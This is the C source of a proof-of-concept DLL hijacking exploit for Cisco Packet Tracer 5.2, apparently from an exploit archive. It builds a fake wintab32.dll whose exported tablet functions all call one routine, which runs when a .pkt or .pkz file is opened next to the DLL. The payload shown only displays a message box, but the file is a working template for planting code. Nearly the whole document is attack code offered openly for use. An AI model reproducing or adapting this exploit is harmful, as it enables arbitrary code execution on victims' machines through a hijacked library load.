/*
Title: Cisco Packet Tracer 5.2 DLL Hijacking Exploit (wintab32.dll)
Date:05/08/2010
Author: CCNA
Tested on: Windows XP SP 2
Extension: .pkt .pkz
Greets: xokaido, hex, hektor, classical
*/

#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void WTInfoA() { theCode(); }
DllExport void WTOpenA() { theCode(); }
DllExport void WTClose() { theCode(); }
DllExport void WTPacketsGet() { theCode(); }
DllExport void WTPacket() { theCode(); }
DllExport void GetFunctionKeysEx() { theCode(); }
DllExport void RemoveTaskBarIcon() { theCode(); }
DllExport void RunTaskBarIcon() { theCode(); }
DllExport void SetFunctionKeysEx() { theCode(); }
DllExport void TGL_Attach() { theCode(); }
DllExport void TGL_Close() { theCode(); }
DllExport void TGL_Detach() { theCode(); }
DllExport void TGL_EndLine() { theCode(); }
DllExport void TGL_Get() { theCode(); }
DllExport void TGL_LineTo() { theCode(); }
DllExport void TGL_MoveTo() { theCode(); }
DllExport void TGL_Open() { theCode(); }
DllExport void TGL_Set() { theCode(); }
DllExport void WTOnEvent() { theCode(); }
DllExport void WTEnable() { theCode(); }
DllExport void WTOverlap() { theCode(); }
DllExport void WTServiceStart() { theCode(); }
DllExport void WTServiceStop() { theCode(); }
DllExport void WTSetDevice() { theCode(); }
DllExport void CloseTabletDevice() { theCode(); }
DllExport void CreateTaskBarIcon() { theCode(); }
DllExport void OpenTabletDevice() { theCode(); }
DllExport void RegDeleteFKeys() { theCode(); }
DllExport void RegGetFKeys() { theCode(); }
DllExport void RunClientSideService() { theCode(); }
DllExport void SetFunctionKeys() { theCode(); }
DllExport void TDCalibration() { theCode(); } 
DllExport void TDGetHwInfoEx() { theCode(); }
DllExport void TDGetHwInfoExV2() { theCode(); }
DllExport void TDGetInfoEx() { theCode(); }
DllExport void TDGetProtectData() { theCode(); }
DllExport void TDSetInfoEx() { theCode(); }
DllExport void UpdateTaskBar() { theCode(); }
DllExport void WTConfig() { theCode(); }
DllExport void WTGetA() { theCode(); }
DllExport void WTSetA() { theCode(); }
DllExport void WTExtGet() { theCode(); }
DllExport void WTExtSet() { theCode(); }
DllExport void WTSave() { theCode(); }
DllExport void WTRestore() { theCode(); }
DllExport void WTGetActiveSessionID() { theCode(); }
DllExport void WTSetActiveSessionID() { theCode(); }
DllExport void WTPacketsPeek() { theCode(); }
DllExport void WTDataGet() { theCode(); }
DllExport void WTDataPeek() { theCode(); }
DllExport void WTQueueSizeGet() { theCode(); }
DllExport void WTQueueSizeSet() { theCode(); }
DllExport void WTMgrOpen() { theCode(); }
DllExport void WTMgrClose() { theCode(); }
DllExport void WTMgrContextEnum() { theCode(); }
DllExport void WTMgrContextOwner() { theCode(); }
DllExport void WTMgrDefContext() { theCode(); }
DllExport void WTMgrDeviceConfig() { theCode(); }
DllExport void WTMgrExt() { theCode(); }
DllExport void WTMgrCsrEnable() { theCode(); }
DllExport void WTMgrCsrButtonMap() { theCode(); }
DllExport void WTMgrCsrPressureBtnMarks() { theCode(); }
DllExport void WTMgrCsrPressureResponse() { theCode(); }
DllExport void WTMgrCsrExt() { theCode(); }
DllExport void WTQueuePacketsEx() { theCode(); }
DllExport void WTMgrCsrPressureBtnMarksEx() { theCode(); }
DllExport void WTMgrConfigReplaceExA() { theCode(); }
DllExport void WTMgrPacketHookExA() { theCode(); }
DllExport void WTMgrPacketUnhook() { theCode(); }
DllExport void WTMgrPacketHookNext() { theCode(); }
DllExport void WTInfoW() { theCode(); }
DllExport void WTOpenW() { theCode(); }
DllExport void WTGetW() { theCode(); }
DllExport void WTSetW() { theCode(); }
DllExport void DllEntryPoint() { theCode(); }   

int theCode()
{
  MessageBox(0, "You got it !", "DLL Message", MB_OK);
  return 0;
}

